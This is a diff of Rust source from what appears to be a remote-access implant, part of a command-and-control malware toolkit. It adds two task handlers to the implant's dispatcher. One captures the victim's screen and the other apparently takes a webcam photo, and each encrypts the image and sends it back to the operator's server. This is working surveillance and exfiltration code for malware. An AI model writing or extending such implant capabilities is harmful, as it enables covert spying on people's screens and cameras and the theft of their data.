@@ -9,7 +9,7 @@ use x25519_dalek::{PublicKey, StaticSecret};
 
 use crate::http::result;
 use crate::models::task;
-use crate::tasks::{shell, system};
+use crate::tasks::{images, shell, system};
 use crate::utils::network_encryption;
 use crate::{errors::ImplantError, HOST, PORT, PROTOCOL};
 
@@ -135,6 +135,26 @@ pub fn handle_available_tasks(
                         build_encrypted_response(&blake3_hashed_key, stdout, implant_id);
                     result::send_task(&task_id, encrypted_response)?;
                 }
+            }
+            task::Tasks::TakeScreenshot => {
+                let image_bytes = images::take_screenshot()?;
+
+                // Encrypt and send system_info
+                let task_id = task.task_id.to_string();
+                let encrypted_response =
+                    build_encrypted_response(&blake3_hashed_key, image_bytes, implant_id);
+
+                result::send_task(&task_id, encrypted_response)?;
+            }
+            task::Tasks::TakePicture => {
+                let image_bytes = images::take_picture()?;
+
+                // Encrypt and send system_info
+                let task_id = task.task_id.to_string();
+                let encrypted_response =
+                    build_encrypted_response(&blake3_hashed_key, image_bytes, implant_id);
+
+                result::send_task(&task_id, encrypted_response)?;
             }
             _ => process::exit(1),
         }
